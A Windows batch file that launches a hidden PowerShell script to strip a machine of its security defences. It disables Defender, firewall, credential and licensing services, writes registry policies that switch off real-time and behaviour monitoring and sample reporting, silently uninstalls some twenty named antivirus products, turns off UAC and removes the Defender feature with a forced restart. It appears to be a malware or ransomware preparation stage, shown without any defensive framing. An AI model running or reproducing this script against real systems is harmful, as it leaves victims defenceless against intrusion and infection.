@echo off

powershell.exe -WindowStyle Hidden -Command "

$windowsServices = @(
    'WdBoot',
    'WdFilter',
    'WdNisDrv',
    'WdNisSvc',
    'WinDefend',
    'SecurityHealthService',
    'mpssvc',
    'SharedAccess',
    'KeyIso',
    'VaultSvc',
    'sppsvc',
    'CertPropSvc',
    'SCPolicySvc'
)

foreach ($service in $windowsServices) {
    Set-Service -Name $service -StartupType 'Disabled' > $null
}

$registryPaths = @(
    'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender',
    'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine',
    'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection',
    'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting',
    'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet',
    'HKLM:\System\CurrentControlSet\Services\Netman'
)

$registryValues = @{
    'DisableAntiSpyware' = 1;
    'DisableAntiVirus' = 1;
    'MpEnablePus' = 0;
    'DisableBehaviorMonitoring' = 1;
    'DisableIOAVProtection' = 1;
    'DisableOnAccessProtection' = 1;
    'DisableRealtimeMonitoring' = 1;
    'DisableScanOnRealtimeEnable' = 1;
    'DisableEnhancedNotifications' = 1;
    'DisableBlockAtFirstSeen' = 1;
    'SpynetReporting' = 0;
    'SubmitSamplesConsent' = 0;
    'Start' = 4;
}

foreach ($path in $registryPaths) {
    if (!(Test-Path -Path $path)) { New-Item -Path $path -Force > $null }
    foreach ($key in $registryValues.Keys) {
        New-ItemProperty -Path $path -Name $key -Value $registryValues.$key -PropertyType 'DWORD' -Force > $null
    }
}

$programs = @(
    'Webroot SecureAnywhere',
    'Symantec Endpoint Protection',
    'AVG 2015',
    'McAfee VirusScan Enterprise',
    'McAfee Agent',
    'McAfee DLP Endpoint',
    'McAfee Endpoint Security Platform',
    'McAfee Endpoint Security Threat Prevention',
    'Microsoft Security Client',
    'Malwarebytes Managed Client',
    'Sophos System Protection',
    'Sophos AutoUpdate',
    'Sophos Remote Management System',
    'McAfee SiteAdvisor Enterprise',
    'Symantec Backup Exec Remote Agent for Windows',
    'ESET File Security',
    'Norton AntiVirus',
    'Kaspersky Anti-Virus',
    'Avast Antivirus',
    'Bitdefender Antivirus'
)

foreach ($program in $programs) {
    $app = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -eq $program }
    if ($app) { $app.Uninstall() > $null }
}

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0

Set-MpPreference -DisableRealtimeMonitoring $true > $null
Uninstall-WindowsFeature -Name Windows-Defender -Quiet -Restart > $null

" > $null￼Enter
